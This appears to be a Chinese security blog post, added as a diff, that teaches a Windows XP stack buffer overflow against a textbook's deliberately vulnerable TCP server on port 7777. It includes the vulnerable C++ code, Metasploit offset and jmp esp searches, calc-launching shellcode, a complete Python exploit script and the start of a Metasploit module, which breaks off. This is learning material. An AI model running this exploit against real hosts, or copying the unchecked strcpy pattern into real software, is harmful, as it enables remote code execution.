@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>栈溢出学习 - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.ee4a618df935f0a2b9d9e99663fcbefb3605c141a5835bb785b399615d5fac1e.css" integrity="sha256-7kphjfk18KK52emWY/y&#43;&#43;zYFwUGlg1u3hbOZYV1frB4=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>栈溢出学习</h1>
+        <div>
+            <time datetime="2014-12-06 21:28:56 +0800 CST">发布时间: 2014-12-06 21:28</time>
+            <time datetime="2014-12-06 21:28:56 +0800 CST">更新时间: 2014-12-06 21:28</time>
+        </div>
+    </header>
+
+    <section>
+    <p>暑假实习时和糖果师傅学习了栈溢出，扔了半年，前几天捡起来再次学习一番，纪录笔记如下。</p>
+<h2 id="基础概念">基础概念</h2>
+<ol>
+<li>每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：</li>
+</ol>
+<ul>
+<li>ESP：栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
+<li>EBP：基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li>
+</ul>
+<ol start="2">
+<li>在函数栈帧中，一般包含以下几类重要信息：</li>
+</ol>
+<ul>
+<li>局部变量：为函数局部变量开辟的内存空间。</li>
+<li>栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。</li>
+<li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用钱的代码区中继续执行命令。</li>
+<li>EIP：指令寄存器，其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。可以说如果控制了 EIP 寄存器的内容，就控制了进程 —— 我们让 EIP 指向哪里，CPU 就会去执行哪里的指令。</li>
+</ul>
+<ol start="3">
+<li>函数调用大致包括以下几个步骤。</li>
+</ol>
+<ul>
+<li>参数入栈：将参数从右向左依次压入系统栈中。</li>
+<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行。</li>
+<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。</li>
+<li>栈帧调整：具体包括：</li>
+<li>保存当前栈帧状态值，以备后面恢复本栈帧时使用（EBP入栈）</li>
+<li>将当前栈帧切换到新栈帧（将ESP 值装入 EBP，更新栈帧底部）</li>
+<li>给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）</li>
+</ul>
+<ol start="4">
+<li>按照函数调用约定组织起来的系统栈结构如下：</li>
+</ol>
+<p><img src="stack-overflow-1.png" alt=""></p>
+<ol start="5">
+<li>一般情况下，ESP 寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，ESP 所指的位置恰好时我们所淹没的返回地址的下一个位置（因为 ESP 永远指向系统栈最上面一个栈帧的栈顶）。</li>
+</ol>
+<h2 id="漏洞代码">漏洞代码</h2>
+<p>测试的漏洞为《0day 安全 软件漏洞分析技术》一书中第 4 章提供的 TCP Server，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winsock2.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;ws2_32.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">msg_display</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> buf)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> msg[<span style="color:#ae81ff">200</span>];
+</span></span><span style="display:flex;"><span>    strcpy(msg, buf); <span style="color:#75715e">//overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;************************************************&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;received:&#34;</span> <span style="color:#f92672">&lt;&lt;</span>endl;
+</span></span><span style="display:flex;"><span>    cout <span style="color:#f92672">&lt;&lt;</span> msg <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sock, msgsock, lenth, receive_len;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr_in</span> sock_server, sock_client;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x200</span>];
+</span></span><span style="display:flex;"><span>    WSADATA wsa;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WSAStartup(MAKEWORD(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>), <span style="color:#f92672">&amp;</span>wsa);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((sock<span style="color:#f92672">=</span>socket(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>))<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> sock <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;sock creating error!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sock_server.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>    sock_server.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">7777</span>);
+</span></span><span style="display:flex;"><span>    sock_server.sin_addr.s_addr <span style="color:#f92672">=</span> htonl(INADDR_ANY);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bind(sock, (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sock_server, <span style="color:#66d9ef">sizeof</span>(sock_server)))
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;binding stream socket error!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;************************************************&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;           exploit target server 1.0            &#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;************************************************&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>    listen(sock, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lenth <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>        msgsock <span style="color:#f92672">=</span> accept(sock, (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sock_client, (<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>lenth);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (msgsock <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;aaccept error!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                memset(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ((receive_len <span style="color:#f92672">=</span> recv(msgsock, buf, <span style="color:#66d9ef">sizeof</span>(buf), <span style="color:#ae81ff">0</span>))<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;reading stream message erro!&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
+</span></span><span style="display:flex;"><span>                    receive_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                msg_display(buf);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">while</span> (receive_len);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            closesocket(msgsock);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WSACleanup();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="计算溢出长度">计算溢出长度</h2>
+<p>使用 metasploit tools 中的pattern_create.rb 与 pattern_offset.rb 计算溢出长度。首先生成一个长度为 500 的模版字符：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@sh3ll-me:/opt/metasploit-framework/tools<span style="color:#f92672">(</span>master○<span style="color:#f92672">)</span> <span style="color:#75715e"># ./pattern_create.rb 500</span>
+</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+</span></span></code></pre></div><p>发送模版字符串到 TCP Server 后，程序崩溃，纪录其崩溃地址：</p>
+<p><img src="stack-overflow-2.png" alt=""></p>
+<p>计算其偏移：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@sh3ll-me:/opt/metasploit-framework/tools<span style="color:#f92672">(</span>master○<span style="color:#f92672">)</span> <span style="color:#75715e"># ./pattern_offset.rb 0x37674136</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">200</span>
+</span></span></code></pre></div><h2 id="exploit-it">Exploit It!</h2>
+<p>根据栈结构，可以构造如下的溢出字符串：</p>
+<pre tabindex="0"><code>buf(200) + ret(4) + shellcode
+</code></pre><p>其中返回地址 ret 用 jmp esp 的地址覆盖。</p>
+<h3 id="查找-jmp-esp-地址">查找 jmp esp 地址</h3>
+<p>运行 TCP Server，通过 LoadPE 可以查看出其所加载的所有 dll：</p>
+<p><img src="stack-overflow-3.png" alt=""></p>
+<p>这里我在 kernel32.dll 中查找 jmp esp 地址：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@sh3ll-me:/opt/metasploit-framework<span style="color:#f92672">(</span>master○<span style="color:#f92672">)</span> <span style="color:#75715e"># ./msfpescan -j esp /tmp/kernel32.dll</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>/tmp/kernel32.dll<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x7c86467b jmp esp
+</span></span><span style="display:flex;"><span>0x7c903015 push esp; retn 0x0353
+</span></span></code></pre></div><h3 id="metasploit-生成-shellcode">Metasploit 生成 shellcode</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf &gt; use payload/windows/exec
+</span></span><span style="display:flex;"><span>msf payload<span style="color:#f92672">(</span>exec<span style="color:#f92672">)</span> &gt; set cmd calc
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span>&gt; calc
+</span></span><span style="display:flex;"><span>msf payload<span style="color:#f92672">(</span>exec<span style="color:#f92672">)</span> &gt; generate -b <span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">03</span> -t python
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># windows/exec - 213 bytes</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># http://www.metasploit.com</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encoder: x86/countdown</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># VERBOSE=false, PrependMigrate=false, EXITFUNC=process,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CMD=calc</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x33\xc9\xb1\xc3\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x0e\x07\xe2\xfa\xfd\xea\x8a\x04\x05\x06\x67\x81\xec&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x3b\xd9\x68\x86\x5c\x3f\x9b\x43\x1e\x98\x46\x01\x9d&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x65\x30\x16\xad\x51\x3a\x2c\xe1\x2e\xe0\x8d\x1e\x42&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x58\x27\x0a\x07\xe9\xe6\x27\x2a\xeb\xcf\xde\x7d\x67&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\xba\x60\x23\xbf\x77\x0a\x36\xe8\xb2\x7a\x43\xb9\xfd&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x4a\x75\x41\x91\x12\xc8\x0c\x5d\xcd\x1f\x68\x48\x99&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\xa8\x70\x04\xc5\x7b\xdb\x50\x84\x62\xab\x64\x96\xfb&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x99\x96\x57\x5a\x9b\x65\xbe\x2a\x94\x62\x1f\x9b\x5f&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x18\x42\x12\x8a\x31\xe1\x33\x48\x6c\xbd\x09\xfb\x7d&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x39\xf8\x2c\x69\x77\xa4\xf3\x7d\xf1\x7a\xac\xf4\x3a&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x5b\xa4\xda\xd9\xe2\xdd\xdf\xd7\x78\x68\xd1\xd5\xd1&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x07\x9f\x65\x09\xcd\xfb\x93\x1e\x11\x2c\x96\x97\x98&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\xc9\xf2\xaa\x17\xf2\x19\x60\x75\x1a\x08\x66\x46\xf8&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\xce\x01\x3d\x14\x37\x54\x79\x91\xa8\xd3\xba\x31\x49&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\x53\xc1\xb0\x0d\xf0\xab\xcb\xd5\xd1\xbc\xee\x41\x6a&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;\xa3\xa0\xae\xa0\xc4&#34;</span>
+</span></span></code></pre></div><p>注：<code>\x00\x03</code> 为坏字符，应过滤。</p>
+<h3 id="构建溢出脚本">构建溢出脚本</h3>
+<p>将 buf、ret、shellcode 进行拼接，发送给服务器：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> socket <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.17.136&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7777</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7B\x46\x86\x7C</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x33\xc9\xb1\xc3\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0e\x07\xe2\xfa\xfd\xea\x8a\x04\x05\x06\x67\x81\xec</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3b\xd9\x68\x86\x5c\x3f\x9b\x43\x1e\x98\x46\x01\x9d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x30\x16\xad\x51\x3a\x2c\xe1\x2e\xe0\x8d\x1e\x42</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x27\x0a\x07\xe9\xe6\x27\x2a\xeb\xcf\xde\x7d\x67</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x60\x23\xbf\x77\x0a\x36\xe8\xb2\x7a\x43\xb9\xfd</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4a\x75\x41\x91\x12\xc8\x0c\x5d\xcd\x1f\x68\x48\x99</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa8\x70\x04\xc5\x7b\xdb\x50\x84\x62\xab\x64\x96\xfb</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\x96\x57\x5a\x9b\x65\xbe\x2a\x94\x62\x1f\x9b\x5f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x42\x12\x8a\x31\xe1\x33\x48\x6c\xbd\x09\xfb\x7d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\xf8\x2c\x69\x77\xa4\xf3\x7d\xf1\x7a\xac\xf4\x3a</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5b\xa4\xda\xd9\xe2\xdd\xdf\xd7\x78\x68\xd1\xd5\xd1</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x07\x9f\x65\x09\xcd\xfb\x93\x1e\x11\x2c\x96\x97\x98</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xf2\xaa\x17\xf2\x19\x60\x75\x1a\x08\x66\x46\xf8</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xce\x01\x3d\x14\x37\x54\x79\x91\xa8\xd3\xba\x31\x49</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\xc1\xb0\x0d\xf0\xab\xcb\xd5\xd1\xbc\xee\x41\x6a</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa3\xa0\xae\xa0\xc4</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sock <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM)
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>connect((host, port))
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>send(buf<span style="color:#f92672">+</span>ret<span style="color:#f92672">+</span>shellcode)
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>执行后，成功弹出计算器，shellcode 已运行！</p>
+<p><img src="stack-overflow-4.png" alt=""></p>
+<h2 id="编写-metasploit-模块">编写 Metasploit 模块</h2>
+<p>MSF 的框架化使得 exploit 的开发更加简单方便：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;msf/core&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Metasploit3</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">Msf</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span> <span style="color:#66d9ef">Exploit</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Remote</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Tcp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initialize</span>(info <span style="color:#f92672">=</span> {})
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>(update_info(
+</span></span><span style="display:flex;"><span>            info,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Name&#39;</span>          <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;test&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Version&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;1.0&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Platform&#39;</span>      <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;win&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Privileged&#39;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;License&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">MSF_LICENSE</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Author&#39;</span>        <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Chu&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Targets&#39;</span>       <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;Windows XP SP3&#39;</span>, {<span style="color:#e6db74">&#39;Ret&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x7C86467B</span> }<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;DefaultTarget&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Payload&#39;</span>       <span style="color:#f92672">=&gt;</span> {
